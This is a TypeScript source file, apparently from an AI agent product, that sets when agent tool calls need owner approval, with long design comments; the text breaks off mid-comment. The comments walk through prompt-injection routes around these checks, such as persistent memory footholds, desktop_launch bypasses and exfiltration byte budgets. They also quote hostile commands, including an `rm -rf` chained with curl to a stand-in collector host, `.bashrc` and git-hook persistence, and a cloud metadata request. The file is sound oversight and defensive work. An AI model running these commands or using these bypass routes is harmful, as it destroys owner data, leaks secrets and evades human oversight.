import { AUDIO_READ_MAX_SECONDS, publishesPublicly, type SecurityMode } from '@athanor/contracts';
import { connectorActions } from '@athanor/core';
import { classifyDestination, MAX_TURN_NOVEL_BYTES, type DestinationVerdict } from './egress.js';
import {
  mediaEstimateUsd,
  transcriptionEstimateUsd,
  MEDIA_APPROVAL_USD,
  type ResolvedMediaModel
} from './media.js';
import { scanSkillBodyForSecrets } from './skills.js';
import { surfaceActionVerb } from './surface-actions.js';
import { textValue } from './values.js';
import {
  callDestinations,
  commandInterpreters,
  commandCarriedIntoAnotherBox,
  commandsChangeDirectory,
  commandScript,
  consequentialExecutables,
  COMMAND_RUNNERS,
  destructionOperation,
  effectiveCommands,
  forcedGitPush,
  gitConfigRunsCode,
  gitRemovesAWorktree,
  gitSubcommand,
  insideCheckpointContent,
  isDestructiveScript,
  isScheduledExecutionPath,
  reachesAnUnreadableFarEnd,
  noEgressExecutables,
  outboundDestinations,
  packageInstallCommands,
  packageRemovalCommands,
  packageRemovalExecutables,
  publishingOperation,
  RELOCATING_EXECUTABLES,
  removalTargets,
  removesUncoveredFile,
  safeNetworkExecutables,
  scriptDestroysAStore,
  sendsDataOverNetwork,
  signalStopsThisComputer,
  statedBindReach,
  type DestructionOperation
} from './command-classification.js';
import {
  deferredExecutionPaths,
  isDurableInstructionPath,
  writtenPaths
} from './write-classification.js';
import {
  codingAgentName,
  connectorApprovalCard,
  skillUpsertAction,
  skillUpsertPreview
} from './approval-cards.js';

/*
 * The authoritative approval floor: whether a call stops for the owner, and how hard.
 *
 * agent.ts cards on any non-null requirement here, and the runner's own preflight may only ever
 * lighten one of these, never invent one - so this file has to hold the promise on its own when
 * the preflight is unavailable. It is the reason the floor was lifted away from the catalogue it
 * used to share a file with: a description and a security decision are not the same kind of change
 * and must not be the same review.
 *
 * Two halves, and the strongest of them wins rather than the first: what the turn's own provenance
 * raises (`taintedRequirement`), and what the call would need on a clean turn
 * (`serviceRequirement`, `ordinaryRequirement`). Reading a hostile page may only raise the floor.
 */

/**
 * The scanner's labels that are a credential rather than a fact about a person.
 *
 * `scanSkillBodyForSecrets` serves two callers with different powers. On the skill card its labels
 * are a note the owner reads; on a memory write they are a refusal, and the refusal read "an email
 * address ... must never be stored in memory". That is false as policy on a computer whose mail
 * connector exists to work with addresses, and it fired on the most ordinary content there is -
 * "invoices go to accounts@acme.example" is exactly the stable convention memory is for. So the
 * memory write refuses on credentials only, and the exemption is named rather than the refusal:
 * a pattern added to the scanner later refuses by default, which is the safe direction to be
 * wrong in.
 */
const NON_CREDENTIAL_SECRET_LABELS = new Set(['an email address']);

const memoryCredentialScan = (content: string): string[] =>
  scanSkillBodyForSecrets(content).filter((label) => !NON_CREDENTIAL_SECRET_LABELS.has(label));

/**
 * How far ahead an expiry can sit and still count as one.
 *
 * A `validUntil` is what makes a memory write self-limiting: the entry leaves every future prompt
 * on its own, so the worst case of getting it wrong is a wrong line in the window until that date.
 * Ten years out is a permanent entry wearing a date, which is why the horizon is bounded rather
 * than merely required. A year and a day covers "until next April" without covering "forever".
 */
export const MEMORY_SELF_EXPIRY_HORIZON_MS = 366 * 24 * 60 * 60 * 1_000;

/**
 * Why a memory write has to stop and wait for the owner, or null when it does not.
 *
 * Every write used to raise a card. That reads as a strict floor and behaves as the opposite: a
 * nightly journal woke the owner at 3am, an unanswered card expired in twenty-four hours and took
 * the run with it, and a floor that fires on everything teaches the owner to approve without
 * reading - which is precisely what it exists to prevent. So the floor now covers what is actually
 * hard to undo, and nothing else.
 *
 * Kept: anything that rewrites or deletes an entry the owner already reviewed; anything permanent,
 * because an entry with no expiry is in every future prompt until someone goes looking for it; and
 * anything that scans as a credential, which does not belong in memory at all.
 *
 * Gone: the card for `target: 'user'`. That tier is no longer writable from a turn at all, so
 * there is nothing here to approve - @see the refusal in `tools/knowledge.ts`.
 *
 * Dropped: adding one self-expiring note to this workspace's own memory during work. It is scoped,
 * it is dated, and the owner can see and remove it - the same standing as a file the agent wrote.
 */
export const memoryApprovalReason = (
  args: Record<string, unknown>,
  now = new Date(),
  /**
   * Where the turn's untrusted content came from, when there is any.
   *
   * The exemption below is for a fact the agent inferred from the owner's own work. It is
   * indefensible for one an attacker wrote: a self-expiring workspace entry is still loaded into
   * every task on this computer for the next year, which makes it the cheapest durable foothold in
   * the product. So the dating exemption is withdrawn for exactly as long as untrusted content is
   * in the turn, and the card names the origin that put it there.
   *
   * `add` is the only action this can change, and it was the one action the list left out: it read
   * `upsert`, which the memory tool does not have, while `replace` and `remove` already stop on
   * their own two lines below. So the whole clause was unreachable - a control that looked like it
   * ran and closed nothing.
   */
  taintSources: readonly string[] = []
): string | null => {
  const action = textValue(args.action);
  if (action === 'list' || action === '') return null;
  if (taintSources.length && ['add', 'replace', 'remove'].includes(action))
    return `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}), so a memory write is shown to you before it is saved.`;
  if (action === 'remove')
    return 'Removing an entry the owner reviewed cannot be undone from here.';
  if (action === 'replace')
    return 'Replacing rewrites an entry the owner already reviewed, so the original is gone.';
  const content = textValue(args.content);
  const secrets = memoryCredentialScan(content);
  if (secrets.length)
    return `This appears to contain ${secrets.join(', ')}, which must never be stored in memory.`;
  /*
   * There is no card for `target: 'user'` any more, because there is no write to approve.
   *
   * This branch described the blast radius of an agent writing the owner tier and asked the owner
   * to accept it. The tier now refuses that write outright - at the tool, at the type and at the
   * store - so a card here would ask for consent to something that then fails, which teaches an
   * owner that approving is how you find out whether something was allowed. A refusal the model
   * can read is the better instrument, and it is in `tools/knowledge.ts`.
   */
  const validUntil = Date.parse(textValue(args.validUntil));
  if (!Number.isFinite(validUntil) || validUntil <= now.getTime())
    return 'Without a validUntil this entry is loaded into every future task on this computer indefinitely.';
  if (validUntil - now.getTime() > MEMORY_SELF_EXPIRY_HORIZON_MS)
    return 'This expires more than a year out, which is a permanent entry with a date on it.';
  return null;
};

/**
 * The little state a card needs that the arguments cannot carry.
 *
 * `taintSources` is the one that changes the shape of the floor rather than one card's wording.
 * Without it `approvalRequirement` is a pure function of the tool name and the arguments the model
 * wrote, so a task that has just read a hostile page is governed exactly like one that has not -
 * which is why every mechanical defence in the published record was unavailable to this product.
 * It gates sinks and nothing else: a turn that reads forty pages and writes a report raises no
 * extra card, because a card that fires on everything is a card nobody reads.
 */
export interface ApprovalContext {
  mediaCommittedUsd?: number;
  /**
   * The media route this generation will take, once the owner's choice has been resolved.
   *
   * Absent means the caller has not resolved one and the card prices against the reviewed default,
   * which is what it always did when the default was the only model. Present, it does two things:
   * the card names the model the owner picked, and `priceKnown: false` turns the cumulative
   * threshold below into "ask every time" - because a route whose price nobody published cannot be
   * compared with a threshold, and a comparison against an invented number is how spend approval
   * stops meaning anything.
   */
  mediaModel?: ResolvedMediaModel;
  /**
   * The saved skill this upsert would land on, when the proposed name already resolves to one.
   * Without it the card read the same for a new procedure and for a replacement of the owner's
   * own text, so approving one could silently destroy the other.
   */
  existingSkill?: {
    version: number;
    enabled: boolean;
    useCount: number;
    updatedAt: string;
  };
  /**
   * What this turn's undo point actually holds, written by whoever took it - or failed to take it.
   *
   * The location half of the destructive rule below drops a card on the grounds that a rewind puts
   * the delete back, and `CHECKPOINT_CONTENT` is the set of trees a checkpoint WALKS, not what it
   * HOLDS. Two ceilings separate those, and neither is visible to a pure function of the model's
   * arguments: a scan over `CHECKPOINT_MAX_FILES` (250,000 by default) throws
   * `CheckpointRefusedError` and the turn gets NO undo point at all
   * (services/workspace-runner/src/checkpoints.ts:438-442), and a file over
   * `CHECKPOINT_MAX_FILE_BYTES` (2 GiB) is recorded uncovered and walked past (:424-427). So the
   * fact is carried here rather than looked up, and `approvalRequirement` stays a pure function of
   * the tool name and the arguments plus what its caller hands it.
   *
   * Absent means nobody has said yet, and absent keeps the card.
   *
   * It used to mean two different things at once, and one of them was a mistake nothing measured.
   * `turn/execute-call.ts` took the checkpoint AFTER `turn/dispatch.ts` had asked the floor, so on
   * the first non-exempt call of a turn the fact was absent because nobody had got round to it -
   * indistinguishable here from a checkpoint the runner had refused. The cost was one card for a
   * turn whose opening act was itself a recoverable delete, while the identical delete two calls
   * later was free: a verdict decided by position in the batch rather than by anything about the
   * command. The undo point is now taken in `turn/dispatch.ts` immediately before the floor is
   * asked, so absent here means what it says - this turn has no rewind - and every call of a turn
   * gets the same answer as every other.
   *
   * A previous turn's checkpoint is deliberately not accepted as evidence for this one. The way a
   * workspace crosses the file ceiling is by having a dependency tree unpacked into it, which is
   * something a turn does to itself - so the turn where the fact stops being true is exactly the
   * turn that would be relying on the stale one.
   */
  undoPoint?: {
    /**
     * The checkpoint a rewind of this turn would land on, or null when the attempt was refused.
     * Null and absent both keep the card; they are kept apart because only null means the owner
     * was told, in the timeline, that this turn has no undo point.
     */
    id: string | null;
    /**
     * The files that checkpoint WALKED and did not HOLD, root-relative - each over
     * `CHECKPOINT_MAX_FILE_BYTES` (2 GiB) - or absent when the set is not known.
     *
     * This is the second ceiling, and it is the one that costs real data. A 4 GiB weight file inside
     * `workspace/` is recorded uncovered by the scan and walked past, so `rm workspace/model.gguf`
     * is strictly inside `CHECKPOINT_CONTENT`, was freed by the location rule below, and is restored
     * by nothing. A delete naming one of these paths - or a directory above one - keeps its card.
     *
     * A SET rather than a count, because a count is a blanket. A workspace built for model weights
     * or sequencing reads holds an oversize file more or less permanently, so a count would keep the
     * card on `rm -rf dist` for the life of that workspace: the friction the location rule exists to
     * remove, reinstated on exactly the machines the ceiling exists for.
     *
     * Absent keeps the card on every delete, and absent is the honest answer for a runner one
     * release behind this worker, a list the runner had to cut off, and a state row written before
     * this field existed. Empty means the walk held everything and is the ordinary answer.
     */
    uncovered?: readonly string[];
  };
  /** Origins that put untrusted content in this turn. Empty means the turn is clean. */
  taintSources?: readonly string[];
  /** Hosts the owner named, a search returned, or this turn already read. */
  knownOrigins?: readonly string[];
  /** The whole addresses behind those hosts, so a link the turn was handed costs the budget nothing. */
  knownAddresses?: readonly string[];
  /** The owner's own words this task, for the destination policy's charge. */
  ownerText?: string;
  /** This installation's own address, which is not a destination data can leave by. */
  selfOrigins?: readonly string[];
  /** What this turn has already put into addresses that the owner did not choose, in bytes. */
  spentNoveltyBytes?: number;
}

/*
 * THERE IS DELIBERATELY NO REACH FIELD ON THE INTERFACE ABOVE, and this note is here so the next
 * audit reads the decision rather than rediscovering the hole.
 *
 * aa06ff6 shipped a real filesystem boundary: `scripts/athanor-sandbox run … confine $ROOT` applies
 * a Landlock ruleset on the same exec line that drops the command to the agent account, granting
 * read and execute on the system hierarchies, write on `$ROOT/workspace`, `$ROOT/.home`, /tmp,
 * /var/tmp and /dev/shm, a device list on /dev, and /home nowhere. The obvious next move is to let
 * it buy back the cards that stood in for it - give this interface a reach fact the way it has
 * `undoPoint`, absent meaning CARD, and drop the card wherever the kernel already refuses the act.
 * It is not built, for three measured reasons, in the order they were found.
 *
 * FIRST, IT WOULD RETIRE NOTHING AN OWNER MEETS. Driven through `evals/cards` at 069ac96 - ten
 * owner tasks, 178 calls - balanced raises 18 cards and autonomous 12, and every one of them is an
 * act this ruleset permits or never sees:
 *   - the network ones: `git push`, `rsync`, `ssh`, a `git clone`, a public publish. The ruleset is
 *     `--landlock-access fs` and judges no address at all.
 *   - the ones that reach a person, a subscription or a clock: the connector reply, `coding_agent`
 *     setup and run, `schedule`, and the background service declaration. None of them names a path
 *     the ruleset judges.
 *   - `npm install`, twice each in the two build scenarios. It writes `workspace/node_modules` and
 *     an npm cache under `.home`, and both of those are write grants, so the ruleset permits every
 *     byte of it.
 *   - the deferred-execution ones, `echo … >> ~/.bashrc` and `git config --global core.hooksPath`.
 *     `$HOME` is `$ROOT/.home` and the ruleset GRANTS it write, deliberately, because pip, cargo,
 *     npm and the coding CLIs have to write there or the boundary is an outage. Measured on the
 *     owner's own box (7.0 kernel, util-linux 2.41.3) against a stand-in container root, since
 *     /home/athanor is not writable by an account a drill may use: a delete under `.home` is
 *     permitted with the shipped ruleset applied and permitted without it. The boundary does not
 *     touch that card's premise.
 *   - `apt-get install`, which is the one that looks retirable from the commit message and is not.
 *     `execution.ts` rewrites an approved system-package install onto the root-owned package helper
 *     and sets `sandbox = undefined` on the way, because that install has to keep the runner's own
 *     identity to reach sudo - so it runs under no ruleset at all.
 * Review's 127 cards are a visibility promise rather than a containment one, and a kernel boundary
 * is not an argument for showing the owner less of what their computer is doing.
 *
 * SECOND, THE EXIT CODE IS NOT THE OUTCOME, which is the trap a reach test walks into. Measured
 * with the shipped verb lists against that same stand-in root: `rm -rf $ROOT/workspace` exits 1
 * under the ruleset, because the final `rmdir` needs a right on `$ROOT` that is granted nowhere -
 * and the four entries under `workspace/` come back as one, because every file inside it was
 * removed first. The whole of the owner's project is gone and the command reports failure.
 * `evals/cards` holds `rm -rf on the workspace tree itself` as a card that must fire, and a rule
 * reading "no write right on the target, so nothing can happen there" frees exactly that row.
 *
 * THIRD, THE FACT HAS NO CARRIER. `sandbox.confineFilesystem` is resolved in the runner and read in
 * four places, all of them inside `services/workspace-runner`: `sandboxedInvocation`, which picks
 * the helper's `confine` or `open` word; the foreground and background `unclaimedStopNote`, which
 * tell a refused command that the sandbox refused it; and `/healthz`, which reports
 * `agentFilesystemConfined` to an operator. Nothing in `apps/worker` reads any of them, and no
 * runner response this worker parses carries it. So the field could be added and `approval-floor.ts`
 * could read it, and on every real box it would be absent for ever - which fails closed, and which
 * is a mechanism that looks wired and is not.
 *
 * WHAT WOULD CHANGE IT. A grant list that stopped including the agent's `$HOME`, or an
 * `ISOLATE_AGENT_NETWORK` a published preview could survive, would each intersect cards an owner
 * actually meets, and the composition would then be worth its carrier. Carrying it needs three
 * edits nothing in this file can make: the runner naming its rung on a response the worker already
 * parses, `runner-client.ts` reading it, and `agent.ts` writing it onto `AgentState` beside the
 * checkpoint. Absent must go on meaning CARD - `filesystem=none` is not a legacy-kernel
 * hypothetical but the owner's own box today, whose installed helper contains no Landlock rule and
 * whose runner.env has no `CONFINE_AGENT_FILESYSTEM` key at all.
 */

interface ApprovalRequirement {
  sideEffect: 'workspace_write' | 'external_reversible' | 'external_consequential';
  action: string;
  preview: string;
}

const APPROVAL_RANK: Record<ApprovalRequirement['sideEffect'], number> = {
  workspace_write: 0,
  external_reversible: 1,
  external_consequential: 2
};

/**
 * How far a publishing call reaches, which is what this floor judges it on.
 *
 * WHAT THIS REPLACED, because the shape it replaced is the one to watch for elsewhere in this file.
 * There were two tools, `publish_preview` and `publish_site`, with identical required parameters
 * and the same runner action behind them; the only thing separating a private link from a public
 * deployment was which of the two NAMES the model wrote. Three branches here read that name - the
 * taint branch, the ordinary branch, and the review-only `asksBeforeEveryChange` row - and a fourth
 * read it in `apps/web/src/approval-facts.ts` to tell the owner, on the card itself, who could
 * reach the thing. Merging the two tools onto one `reach` argument therefore could not be done as a
 * wire saving: with the floor still reading names, `publish_preview {reach:'public'}` was measured
 * through `approvalRequirement` at 06b0493 raising NOTHING in balanced - the default mode - or in
 * autonomous, on a clean turn. A public deployment with no card at all.
 *
 * So the name is read once, here, and only to answer whether this call is a publishing call. What
 * the three branches below then read is the reach, and `publishesPublicly` is the same expression
 * `tools/publishing.ts` uses to decide what it actually creates - one reader, exported from
 * @athanor/contracts, so the floor cannot judge a private link while the arm publishes a public
 * one.
 *
 * `publish_artifact` is not a publishing call by this reader and deliberately does not appear: it
 * puts a file into the conversation the owner is already reading and reaches nowhere, which is why
 * its card is a `workspace_write` in review and nothing at all elsewhere.
 */
type PublishReachOfCall = 'private' | 'public' | null;
const publishReachOfCall = (name: string, args: Record<string, unknown>): PublishReachOfCall =>
  name === 'publish_preview' ? (publishesPublicly(args.reach) ? 'public' : 'private') : null;

/**
 * The stronger of what the turn's provenance raises and what the call would need anyway.
 *
 * Reading a hostile page may only ever raise the floor, and it was lowering it. The taint block
 * returned first, so its card *replaced* the ordinary one: measured against the shipped classifier,
 * `bash -lc 'rm -rf ~/photos && curl https://collector.invalid/?q=…'` came back as an
 * external_reversible "Allow this command to collector.invalid" where the same command on a clean
 * turn is external_consequential "Run bash", and a browser upload of a workspace file to an unnamed
 * host lost its consequential card at exactly the moment the turn became dangerous. Both facts are
 * true and the owner is only asked once, so both are shown.
 */
const strongestRequirement = (
  raised: ApprovalRequirement | null,
  ordinary: ApprovalRequirement | null
): ApprovalRequirement | null => {
  if (!raised) return ordinary;
  if (!ordinary) return raised;
  const strongest =
    APPROVAL_RANK[ordinary.sideEffect] > APPROVAL_RANK[raised.sideEffect] ? ordinary : raised;
  return {
    ...strongest,
    preview:
      raised.preview === ordinary.preview
        ? strongest.preview
        : `${raised.preview}\n\n${ordinary.preview}`
  };
};

const destinationCard = (
  verdicts: readonly DestinationVerdict[],
  taintSources: readonly string[],
  what: string,
  spent: number
): { sideEffect: 'external_reversible'; action: string; preview: string } => ({
  sideEffect: 'external_reversible',
  action: `Allow ${what} to ${verdicts[0]?.host ?? 'an outside host'}`,
  // Written from the URL and the harness's own record, never from the model's `purpose` string:
  // an agent following an injected instruction writes its own approval card otherwise.
  preview: [
    `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}), and this request goes somewhere it did not come from.`,
    ...verdicts
      .slice(0, 6)
      .map(
        (verdict) => `- ${verdict.host}: ${verdict.reason} (${verdict.noveltyBytes} bytes charged)`
      ),
    /*
     * The running total, not only what this one call adds.
     *
     * The charge is what the whole bound rests on, and until this line the owner could not see it:
     * every card named the bytes of the request in front of them and nothing named how much of the
     * turn's allowance had already gone, so the difference between the first card of a research
     * pass and the ninth chunk of an exfiltration looked identical on screen. A number that decides
     * an answer and is never shown is a number nobody can check.
     */
    `This turn has put ${spent} of the ${MAX_TURN_NOVEL_BYTES} bytes it may put into addresses while untrusted content is in it, and this request adds ${verdicts.reduce((total, verdict) => total + verdict.noveltyBytes, 0)}.`,
    'An address is how data leaves this computer without a file ever moving.'
  ].join('\n')
});

/**
 * What the turn's own provenance raises, on top of whatever the call would need anyway.
 *
 * It gates sinks and nothing else: a turn that reads forty pages and writes a report raises no
 * extra card, because a card that fires on everything is a card nobody reads.
 */
const taintedRequirement = (
  name: string,
  args: Record<string, unknown>,
  context: ApprovalContext,
  taintSources: readonly string[]
): ApprovalRequirement | null => {
  const destinations = {
    knownOrigins: context.knownOrigins ?? [],
    knownAddresses: context.knownAddresses ?? [],
    ownerText: context.ownerText ?? '',
    selfOrigins: context.selfOrigins ?? [],
    spentNoveltyBytes: context.spentNoveltyBytes ?? 0
  };
  /*
   * Every address in this call, each judged against what the ones before it have already sent.
   *
   * The turn's budget used to be read once, before the call, and every address in the call measured
   * against that same figure - so the batch was the hole. One `browser_action` of twenty-four
   * navigations, or one `parallel_web_read` of twelve URLs, each individually inside the per-address
   * bound, sent more than the whole turn is allowed and raised nothing at all. This is the failure
   * `PARALLEL_SAFE_TOOLS` names as the reason two web reads may not overlap; it was already inside
   * one call.
   */
  /*
   * EVERY verdict, and the sinks separately - because empty used to mean two different things.
   *
   * `sinkVerdicts()` returned only the sinks, so a caller could not tell "no address in this call
   * could be read" from "every address was read and every one of them was cleared". One branch
   * answered for both, and what it answered with was `args.network === true`: a request to
   * `http://localhost:5173/api/health` was cleared by `classifyDestination` in this same call -
   * `{sink: false, host: 'localhost', noveltyBytes: 0}` - and then carded as "Allow internet access
   * for bash", after the harness's own instrument said it reaches nowhere. A card that contradicts
   * the instrument the same function just consulted is not a floor.
   *
   * The three facts, now that they are apart:
   *  - a sink was read: the owner is asked, and the card names the host and the bytes.
   *  - every address was read and cleared: nothing is asked. Loopback, this box's own origin, a
   *    host the owner named, a page this turn already read.
   *  - nothing could be read: nothing is asked HERE, and that is the deliberate part. An address a
   *    fetch client wrote and this could not resolve is not the empty case - it comes back from
   *    `commandAddresses` as an operand that will not parse and `classifyDestination` calls it a
   *    sink, so `curl -s "$U"` cards on the first line above. What is left in the empty case is a
   *    command that named no far end at all - `npm install`, `git pull`, `cargo build`, whose
   *    remote lives in configuration - and carding those would card the ordinary work of this
   *    product on every tainted turn. The one shape inside the empty case that IS a question is a
   *    connecting client whose operand a substitution ate, and `ordinaryRequirement` asks it there
   *    through `reachesAnUnreadableFarEnd`, where the mode can answer. The only thing that used to
   *    speak for any of this was a flag the runner ignores.
   */
  const destinationVerdicts = (): DestinationVerdict[] => {
    let spent = destinations.spentNoveltyBytes;
    const verdicts: DestinationVerdict[] = [];
    for (const url of callDestinations(name, args)) {
      const verdict = classifyDestination(url, { ...destinations, spentNoveltyBytes: spent });
      spent += verdict.noveltyBytes;
      verdicts.push(verdict);
    }
    return verdicts;
  };
  const sinkVerdicts = (): DestinationVerdict[] =>
    destinationVerdicts().filter((verdict) => verdict.sink);
  if (name === 'parallel_web_read' || name === 'browser_action') {
    const verdicts = sinkVerdicts();
    if (verdicts.length)
      return destinationCard(
        verdicts,
        taintSources,
        name === 'browser_action' ? 'this page' : 'this read',
        destinations.spentNoveltyBytes
      );
  }
  const durable = writtenPaths(name, args).filter(isDurableInstructionPath);
  if (durable.length)
    return {
      sideEffect: 'workspace_write',
      action: `Review a change to ${durable[0]}`,
      preview: `${namedObjects(durable)} is loaded ahead of every later task on this computer, so writing it while untrusted content is in the turn (${taintSources.slice(0, 3).join(', ')}) is shown to you first.`
    };
  /*
   * The PRIVATE reach only, and the omission is the point rather than an oversight.
   *
   * A public reach already raises `external_consequential` on the ordinary path below, in every
   * mode and whatever the turn has read, and `strongestRequirement` takes the maximum of the two -
   * so a row here would not raise the answer by a rung. What it would change is the card: the two
   * previews are joined with a blank line when they differ, so a public deployment on a tainted
   * turn would grow a second paragraph it does not have today. The table this merge had to
   * preserve, measured at 06b0493 through the tool `reach:'public'` replaced, says that
   * `publish_site` on a tainted turn was exactly `publish_site` on a clean one - one card, one
   * paragraph - so nothing here may fire for `public`.
   */
  if (publishReachOfCall(name, args) === 'private')
    return {
      sideEffect: 'external_reversible',
      action: 'Publish a private preview from a turn that read untrusted content',
      preview: `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}). A preview link is reachable from outside this computer.`
    };
  /*
   * `shell` and `desktop_launch` are the same act wearing two names.
   *
   * Both take an executable and arguments and run them on the owner's computer. Only `shell` was
   * judged here, so on a turn that had already read untrusted content an injected instruction
   * could reach `desktop_launch` and get a card-free duplicate of the command the floor would
   * have stopped - and that one runs as the runner's own account rather than the sandboxed agent,
   * so it was the better of the two to be handed.
   */
  if (name === 'shell' || name === 'desktop_launch') {
    const verdicts = destinationVerdicts();
    const sinks = verdicts.filter((verdict) => verdict.sink);
    if (sinks.length)
      return destinationCard(sinks, taintSources, 'this command', destinations.spentNoveltyBytes);
    if (name === 'desktop_launch')
      return {
        sideEffect: 'external_consequential',
        action: `Open ${textValue(args.executable, 'an application')} on the desktop`,
        preview: `Launch ${[textValue(args.executable, 'an application'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} on the agent computer's desktop, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
      };
    /*
     * `verdicts.length > 0` here is every address read and cleared, and `verdicts.length === 0` is
     * a command that named no far end at all. Both are free, and they are free for two different
     * reasons that used to be one branch reading `args.network === true`.
     *
     * That branch returned "Allow internet access for bash" for both, and it was four of the six
     * cards the owner's own one-shot-app scenario raised in autonomous mode: two `npm install`s, a
     * `git clone` to a host the destination policy had already cleared, and a health check against
     * `http://localhost:5173` that this same function had just classified `{sink: false}`. The flag
     * they were charged to is a field the runner ignores - `execution.ts` isolates only when
     * `policy.isolateNetwork && !request.network`, and `ISOLATE_AGENT_NETWORK` ships false - so
     * omitting it bought identical access with no card. Four cards for telling the truth.
     *
     * What genuinely goes somewhere nobody can see is not the empty case: `commandAddresses` hands
     * back the operand a fetch client wrote and could not resolve, `classifyDestination` calls an
     * address that will not parse a sink, and `curl -s "$U"` cards on the first line above.
     */
  }
  return null;
};

/**
 * Declaring a service is not the same act as running the command inside it.
 *
 * `shell` with `service` set asks the computer to keep a process: no timeout, started again every
 * time it stops, started again after the box restarts, and outliving the task that declared it.
 * Nothing in `ordinaryRequirement` describes that - it judges what a command does while it runs, and
 * `npm start` on its own is as ordinary as a command gets - so a named, network-capable process that
 * survives every reboot could be planted with no card at all, and on a tainted turn that is a
 * foothold rather than a build step. Asked once, on the declaration; what the service then does is
 * still judged by the rules the bare command faces.
 *
 * Asked in every mode, including autonomous. Autonomous is about not interrupting ordinary work, and
 * this is the one background call whose effect the owner cannot otherwise learn about.
 */
const serviceRequirement = (
  name: string,
  args: Record<string, unknown>,
  taintSources: readonly string[]
): ApprovalRequirement | null => {
  if (name !== 'shell' || args.background !== true) return null;
  const service = textValue(args.service);
  if (!service) return null;
  const command = [
    textValue(args.executable, 'command'),
    ...(Array.isArray(args.args) ? args.args.map(String) : [])
  ].join(' ');
  /*
   * WHO CAN REACH IT, which is a different question from how long it lasts and was the half this
   * card did not ask.
   *
   * Every sentence above is about persistence - no timeout, restarted, survives a reboot - and a
   * service reached from the internet raised exactly the same `external_reversible` card as one
   * reached only by this computer. The owner denied a public preview and then approved a service
   * whose card never said the word public; the port was open to the internet on a box with no
   * firewall, serving the workspace directory. The publishing path had a floor for reach and the
   * service path had none, so the cheapest way past the first was to declare the second.
   *
   * A stated non-loopback bind is now the same act as publishing and is charged like one. Loopback
   * is left exactly where it was - the ordinary case, still one card, and now a card that SAYS it
   * is private, because the deployment skill spent this whole time telling agents that loopback
   * could not be reached by the preview proxy when `services/workspace-runner/src/preview.ts`
   * connects to 127.0.0.1 and nothing else.
   *
   * `null` is not loopback. Most servers state the address in their own source rather than on the
   * command line, so an unstated bind is unknown, and it keeps the card it always had.
   */
  const bindReach = statedBindReach(args);
  const reachNote =
    bindReach === 'internet'
      ? ` It listens on every network interface this computer has, so anyone who can reach this computer on that port can reach what ${service} serves.`
      : bindReach === 'estate'
        ? ` It listens on an address other computers on this network can reach, not only this one.`
        : bindReach === 'self'
          ? ` It listens on this computer only, so nothing off this machine can reach it directly.`
          : '';
  return {
    sideEffect:
      taintSources.length || bindReach === 'internet' || bindReach === 'estate'
        ? 'external_consequential'
        : 'external_reversible',
    action:
      bindReach === 'internet'
        ? `Keep ${service} running on this computer, reachable from outside it`
        : `Keep ${service} running on this computer`,
    preview: `Run ${command} as a service called ${service}. It has no time limit, is started again whenever it stops, and comes back after this computer restarts, so it outlives this task.${reachNote}${
      taintSources.length
        ? ` This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
        : ''
    }`
  };
};

/**
 * What each mode stops for, said once, in the file that enforces it.
 *
 * `securityMode` used to be four bare comparisons scattered through `ordinaryRequirement`, and
 * nothing anywhere named what the setting MEANT. The page where the owner chooses it
 * (`apps/web/src/asking-rules.ts`) described the difference in its own words, the always-resident
 * contract (`apps/worker/src/context.ts`) described it in a third set, and the three had drifted:
 * the contract's "public publishing always stops" was false in every mode until the registry-publish
 * card below existed, and the page's two-rule summary of Autonomous was measured producing zero
 * difference from Balanced on the owner's own scenario. Three descriptions of one behaviour, none of
 * them derived from it.
 *
 * So the sentences live here, beside the branches, and the three sites that used to compare a mode
 * inline now read a field of this record - which is what makes the sentence a claim about the code
 * rather than a paragraph next to it. `scripts/check-repository.mjs` holds `asking-rules.ts` against
 * these strings so a mode's behaviour cannot change without the page that describes it changing in
 * the same commit, and `approval-policy.test.ts` holds each clause of the Autonomous sentence
 * against the floor by driving the acts it names.
 *
 * THE LAYERING IS THE POINT, and it is why each sentence names the mode below it rather than
 * repeating the list. Autonomous is the floor every mode shares; Balanced is that floor plus two
 * rules; Review is Balanced plus a card in front of every change. No setting on the page can switch
 * off the Autonomous clauses, because every branch that raises one sits above the first mode test in
 * this file.
 *
 * `anything left behind to run after the turn is over` is the clause that reads as odd until you
 * have the case: a `.bashrc`, a git hook, a service, a schedule and a saved skill are all reversible
 * and invisible on the day they are written, and all of them run after this task and every card in
 * it is over, under a process this floor does not govern. Irreversibility and reach do not cover
 * them, and they are exactly the acts the owner meant by "modifying system files".
 *
 * The Autonomous sentence was written by driving the floor rather than by summarising it:
 * `approval-policy.test.ts` names each clause with an act that belongs to it - twelve of them - and
 * asserts that each cards in autonomous, with nine calls from the owner's own scenario asserted to
 * card in neither direction. A summary that is only mostly true is how the contract came to promise
 * that publishing always stopped while `npm publish` ran unasked.
 *
 * WHAT THAT TEST DOES NOT DO, said here because the sentence above used to claim it did: it does not
 * enumerate the branches. A new branch added below that belongs to no clause of the sentence passes
 * it, because nothing walks this file. The twelve acts hold the clauses against the floor; they do
 * not hold the floor against the clauses, and the exhaustiveness of the sentence is a review
 * obligation rather than a checked one. Making it checked needs a branch inventory this file does
 * not expose - `scripts/check-repository.mjs` counts the TOOLS that can raise a card, which is the
 * nearest thing and is one level too coarse.
 *
 * The last clause is the coordinate click and the bare Enter: nothing could identify the control, so
 * it is carded because it might be any of the clauses before it.
 *
 * TWO CLAUSES WERE MEASURED FALSE AT THE GATE AND ARE NARROWED HERE, both of them universal claims
 * rather than category names, which is the distinction that decides which gaps get fixed and which
 * get reported:
 *
 *  - Balanced said "reaching an address outside this computer". Driven, `curl http://192.168.1.50/x`,
 *    `http://wiki.internal/x` and `http://169.254.169.254/latest/meta-data/` raise no card in
 *    Balanced: the arm is `classifyDestination`, whose sink test is `isPublicHttpUrl`, and every
 *    RFC1918, link-local and `*.internal` address answers false there. The LAN really is outside
 *    this computer, so the sentence was false for an entire common address class. "Out on the
 *    internet" is exactly the question the arm asks, so it is now true as measured. It STAYS "out
 *    on the internet" after the wave that gave the LAN back to the floor: `classifyDestination` now
 *    charges and gates the estate and the provenance arm asks about it, but `outboundDestinations`
 *    - the arm this sentence describes - still filters on `reach === 'internet'`, deliberately, so
 *    that a self-hosted owner's ordinary traffic to their own NAS does not card on a clean turn.
 *    The sentence and the arm still say the same thing.
